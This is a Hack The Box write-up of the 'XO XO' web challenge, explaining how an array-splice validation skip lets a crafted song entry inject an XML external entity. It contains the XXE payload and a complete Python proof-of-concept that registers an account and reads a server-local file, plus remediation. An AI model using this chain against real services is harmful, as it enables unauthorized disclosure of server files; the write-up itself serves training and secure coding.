---
title: "Hack The Box XO XO — Filter Bypass to XML External Entity Injection"
slug: "hack-the-box-xo-xo-xxe-writeup"
date: "2026-11-17"
author: "GregoGuard"
description: "An evidence-driven Hack The Box web challenge walkthrough: bypassing an array-validation bug, injecting a DTD entity, and demonstrating server-side file disclosure through libxmljs. Flag intentionally withheld."
tags:
  - Hack The Box
  - GregoGuard
  - Web Security
  - Node.js
  - XML External Entity
  - XXE
  - Secure Coding
  - CTF
status: "Completed — independently verified on the live lab"
---

# Hack The Box XO XO — From an Array Bug to XXE

*GregoGuard Research · November 17, 2026 · Web exploitation / source-code review*

> **Spoiler and scope notice:** This is a technical walkthrough of an authorized Hack The Box challenge. It includes the vulnerability, a working proof-of-concept, and how the result was verified, but **intentionally does not reveal the challenge flag**. The instance host and port were ephemeral; use the address assigned to your own challenge session. Do not direct the proof-of-concept at systems without authorization.

## Executive summary

**XO XO** is a small Node.js/Express web application where authenticated users create music-themed cards. A request to `POST /createSongCards` accepts an array of song objects, validates their fields, generates XML using string interpolation, and parses it using `libxmljs`.

Two flaws become exploitable when chained:

1. **Input-validation bypass:** the application removes songs mentioning a particular artist by calling `songs.splice(i, 1)` inside a forward-moving `for` loop. Removing an element shifts the following element left, but the index advances anyway. That next item is never validated.
2. **XML External Entity injection (XXE):** the application interpolates user-controlled strings directly into an XML document type declaration (DTD) and enables entity replacement with `libxmljs.parseXml(xml, { replaceEntities: true })`. The skipped item can introduce a new external entity referencing a local file on the server.

A fresh, unprivileged account was sufficient to reproduce the issue. The live challenge accepted the payload, created two cards from a three-entry submission, and returned the requested server-side file contents inside the `thoughts` field of the first card. The secret value is deliberately redacted in this article.

| Attribute | Detail |
|---|---|
| Challenge | Hack The Box — XO XO |
| Category | Web / source-code analysis |
| Stack | Node.js, Express, `libxmljs` |
| Entry point | `POST /createSongCards` (authenticated) |
| Retrieval endpoint | `GET /api/songs` (authenticated) |
| Main weakness | CWE-611: Improper Restriction of XML External Entity Reference |
| Contributing weakness | CWE-20: Improper Input Validation |
| Demonstrated impact | Server-side local file disclosure |
| Validation | Successful against the live HTB instance, November 17, 2026 |

## 1. Initial reconnaissance and source review

The provided archive contained the application source and a Docker-based deployment layout. Rather than starting with a blind attack, I inspected the files offline and followed the request lifecycle. The important project files were:

```text
web_xo_xo_exploit/
├── Dockerfile
├── entrypoint.sh
├── flag.txt              # local testing placeholder, not the live result
├── index.js              # authentication, validation, XML construction
├── package.json
└── public/
    ├── index.html
    ├── register.html
    ├── login.html
    └── dashboard.html
```

The supplied archive was protected with the standard HTB challenge password, `hackthebox`. The application has several routes, but the relevant sequence is compact:

| Method | Route | Purpose |
|---|---|---|
| `POST` | `/api/register` | Creates an account and sets a signed JWT cookie |
| `POST` | `/api/login` | Authenticates an existing account |
| `POST` | `/createSongCards` | Validates and stores song cards |
| `GET` | `/api/songs` | Returns the signed-in user's cards |

The registration route (source lines 159–209) issues an authentication cookie immediately after registration. As a result, there was no reason to target an administrator account or crack the hashes embedded in the source: a disposable normal account gives access to the vulnerable endpoint.

The page JavaScript submits song data as JSON, but the backend later converts it into XML. **That server-side JSON-to-XML conversion is the crucial trust boundary.**

## 2. The validation skip

At the start of the card-creation handler (source lines 248–281), the application copies the request body and requires at least three songs:

```javascript
var songs = Array.from(req.body);
if (songs.length < 3) {
    return res.status(400).json({
        error: 'You have to talk about at least 3 songs!'
    });
}
```

Then it validates each object. An input sanitizer rejects strings containing DTD-related patterns including `<!`, `SYSTEM`, `ENTITY`, and `DOCTYPE`. That seems to block a straightforward XXE payload—until the loop removes entries:

```javascript
for (var i = 0; i < songs.length; i++) {
    const song = songs[i];

    // Required-field, type, length, and forbidden-pattern checks ...

    if (song.artist.toLowerCase().includes('drizzy') ||
        song.artist.toLowerCase().includes('drake')) {
        songs.splice(i, 1);
        continue;
    }
}
```

The problem is not the artist filter itself; it is mutating the array while walking forward through it.

Consider this submission:

| Original index | Entry | Intended behavior |
|---|---|---|
| `0` | Artist: `Drake` | Filtered out with `splice(0, 1)` |
| `1` | Malicious XML-bearing entry | **Moves to index 0; validation skips it** |
| `2` | Ordinary song | Moves to index 1 and is validated normally |

After the deletion, the array has two entries. The loop's `i++` advances to index 1, so the malicious entry now at index 0 is never checked by `sanitizeInput()`. The earlier three-song minimum was evaluated *before* filtering and is not rechecked.

This makes the blacklist irrelevant for the skipped object, including its dangerous `<!ENTITY` substring.

## 3. The XML parser turns the skip into file disclosure

For each surviving song, the server constructs an XML string (source lines 283–300). The user values are inserted directly into DTD entity declarations:

```javascript
const xml = `<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE songCard [
        <!ENTITY songName "${song.songName}">
        <!ENTITY artist "${song.artist}">
        <!ENTITY thoughts "${song.thoughts}">]>
    <songCard>
        <cardInfo>
            <songName>&songName;</songName>
            <artist>&artist;</artist>
            <thoughts>&thoughts;</thoughts>
        </cardInfo>
    </songCard>`;

const doc = libxmljs.parseXml(xml, { replaceEntities: true });
```

This is a particularly dangerous construction: the interpolated `songName` lives *inside the DTD*. If an attacker can terminate its quoted value, they can append another entity declaration. With external entity replacement enabled, the parser may resolve `SYSTEM` identifiers such as a `file://` URI.

The entry that bypasses validation uses the following song title:

```xml
intro"><!ENTITY xxe SYSTEM "file:///flag.txt"><!ENTITY pad "
```

Its thoughts field is a reference to the newly defined entity:

```xml
&xxe;
```

The injected `">` closes the original `songName` declaration; the new `xxe` entity points to the server-side target file; the trailing `<!ENTITY pad "` absorbs the quote added by the application's template so the DTD remains syntactically valid.

The beginning of the resulting DTD therefore looks like this:

```xml
<!DOCTYPE songCard [
    <!ENTITY songName "intro"><!ENTITY xxe SYSTEM "file:///flag.txt"><!ENTITY pad "">
    <!ENTITY artist "The Weeknd">
    <!ENTITY thoughts "&xxe;">
]>
```

When the server parses the XML, the `thoughts` element dereferences the `thoughts` entity, which in turn references `xxe`. The file content is then stored in `songData.thoughts` (source lines 305–325) and made available through `GET /api/songs`.

**Important distinction:** this does not read the file from the attacking workstation. `file:///flag.txt` is resolved by the XML parser running in the **challenge container**.

## 4. Building the proof-of-concept

The proof-of-concept performs the entire chain through normal HTTP routes. Its credentials are randomly generated for each run and used only within the session; the existing administrator accounts are not involved.

Install the single Python dependency:

```bash
python3 -m pip install requests
```

Save the following as `htb_xo_xo_xxe_exploit.py`:

```python
#!/usr/bin/env python3
"""HTB XO XO: authenticated array-filter bypass + XXE proof-of-concept."""

import argparse
import secrets
import requests


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('base_url', help='http://CHALLENGE_HOST:PORT')
    parser.add_argument('--file', default='/flag.txt')
    args = parser.parse_args()

    base = args.base_url.rstrip('/')
    session = requests.Session()
    session.trust_env = False

    username = 'gg_' + secrets.token_hex(6)
    password = secrets.token_urlsafe(18)

    # Registration issues the authentication cookie for subsequent requests.
    response = session.post(
        f'{base}/api/register',
        json={
            'username': username,
            'password': password,
            'confirmPassword': password,
        },
        timeout=15,
    )
    response.raise_for_status()
    print('[+] Account registered')

    # First entry is removed; the second shifts left and escapes validation.
    injected_name = (
        'intro"><!ENTITY xxe SYSTEM "file://' +
        args.file + '"><!ENTITY pad "'
    )
    songs = [
        {'songName': 'Filtered', 'artist': 'Drake',
         'thoughts': 'Removed by filter'},
        {'songName': injected_name, 'artist': 'The Weeknd',
         'thoughts': '&xxe;'},
        {'songName': 'Starboy', 'artist': 'The Weeknd',
         'thoughts': 'Ordinary entry'},
    ]

    response = session.post(
        f'{base}/createSongCards', json=songs, timeout=15
    )
    response.raise_for_status()
    print('[+] Card submission:', response.status_code, response.json())

    response = session.get(f'{base}/api/songs', timeout=15)
    response.raise_for_status()
    cards = response.json()
    print('[+] Returned cards:', len(cards))

    for index, card in enumerate(cards, start=1):
        data = card.get('songData', {})
        print(f'--- Card {index} ---')
        print('Name:', data.get('songName', ''))
        print('Artist:', data.get('artist', ''))
        print('Thoughts:', data.get('thoughts', ''))


if __name__ == '__main__':
    main()
```

Run it against the assigned live HTB instance:

```bash
python3 htb_xo_xo_xxe_exploit.py http://CHALLENGE_HOST:PORT
```

The optional `--file` parameter controls which local file the XML parser attempts to read. In this challenge, the objective file was `/flag.txt`. The same technique could disclose other files readable by the application process; no further file access was necessary for the exercise.

## 5. Live validation and evidence

The test on November 17, 2026 succeeded against the provisioned Hack The Box instance. The request to create song cards returned HTTP **200** and the response:

```json
{"success":true,"message":"Song cards created!"}
```

A subsequent call to `GET /api/songs` returned **two** entries, despite three being submitted, confirming that the first song was filtered. The first returned card had the injected title reduced to `intro`, and its `thoughts` property contained the objective file's contents. The second card was the ordinary `Starboy` entry:

```text
[+] Card creation HTTP status: 200
[+] Fetched 2 card(s)

--- Card 1: intro ---
Artist: The Weeknd
Thoughts: [REDACTED — server-side file contents recovered]

--- Card 2: Starboy ---
Artist: The Weeknd
Thoughts: Ordinary entry
```

This validates the complete chain rather than merely demonstrating that a server accepted malformed XML. The response shows (1) successful authentication, (2) deletion of the filtered entry, (3) a surviving skipped entry, and (4) entity expansion reaching the application response. The recovered challenge flag was submitted separately and is not included in this publication.

### Evidence and reproducibility

The source bundle, the isolated extraction, and the proof-of-concept script were retained as local research evidence. SHA-256 hashes of the original inputs are recorded for repeatability:

| Artifact | SHA-256 |
|---|---|
| Provided challenge ZIP | `0332d4cc8a7a04cfde64adc114d50d84b00d5bc100a94c01d4042fe8e0e00df1` |
| Extracted `index.js` | `b9fdc7e948f88aadfb7b315f2354877d11ab0f1de9b2459929d0d918a607d86c` |

The URL's IP and port are deliberately omitted because HTB challenge allocations are temporary and should not be treated as a reusable public target.

## 6. Root cause and remediation

The exploit requires **both** flaws to become a reliable file-read primitive, but each should be fixed independently.

### Fix the array iteration

Do not call `splice()` on the array being traversed with an increasing index. Filter into a new collection, then validate every retained object:

```javascript
if (!Array.isArray(req.body) || req.body.length < 3) {
    return res.status(400).json({ error: 'At least three songs required' });
}

const retainedSongs = req.body.filter(song =>
    song && typeof song.artist === 'string' &&
    !/drake|drizzy/i.test(song.artist)
);

for (const song of retainedSongs) {
    // Validate required fields, types, lengths, and allowed values here.
    // Reject the whole request if any retained song is invalid.
}
```

This removes the skipped-element condition. Notice that it does **not**, by itself, eliminate the XXE risk: validation and safe parsing are separate controls.

### Stop creating DTD declarations from user input

The application doesn't need XML entities to store song names, artists, or thoughts. The safest source-level repair is to avoid unnecessary XML processing and store validated structured values directly:

```javascript
const songData = {
    songName: song.songName,
    artist: song.artist,
    thoughts: song.thoughts,
    createdAt: new Date().toISOString(),
};
```

If XML is a genuine functional requirement, use a proper XML builder that escapes text nodes and attributes, **do not interpolate untrusted input into a DTD**, and configure the XML parser to reject DTD/external entity resolution. Blacklisting a handful of keywords is not a substitute for safe construction and parser hardening.

### Add regression coverage

Test the combined failure mode, not just simple malicious strings. At minimum, verify that:

- A filtered entry followed by a DTD-like entry does not bypass validation.
- Submissions with invalid types, malformed objects, and forbidden XML syntax are rejected.
- XML parsing cannot resolve local files, remote resources, or nested external entities.
- The number of accepted entries and the authenticated account's stored records are consistent.
- The application never returns server-local file content through user-controlled card fields.

**Weakness mapping:** CWE-20 (validation bypass), CWE-611 (XXE), and CWE-200 (information exposure as demonstrated impact). The exact production severity depends on the files and permissions available to the parser process.

## 7. Conclusion

XO XO illustrates how a small control-flow mistake in otherwise ordinary application logic can neutralize a security check. The missing validation would have been a data-integrity issue on its own. Combined with DTD string interpolation and external entity expansion, it became a server-side file-read vulnerability reachable by any registered user.

The most useful lesson is architectural: **validate complete input collections without mutation hazards, keep untrusted values out of markup syntax, and disable parser capabilities the application does not need.** Each control blocks a different part of the chain.

---

*GregoGuard — independent security research and controlled challenge analysis. Source review and exploit validation performed within the authorized Hack The Box environment. Challenge flags and temporary credentials are intentionally excluded from this article.*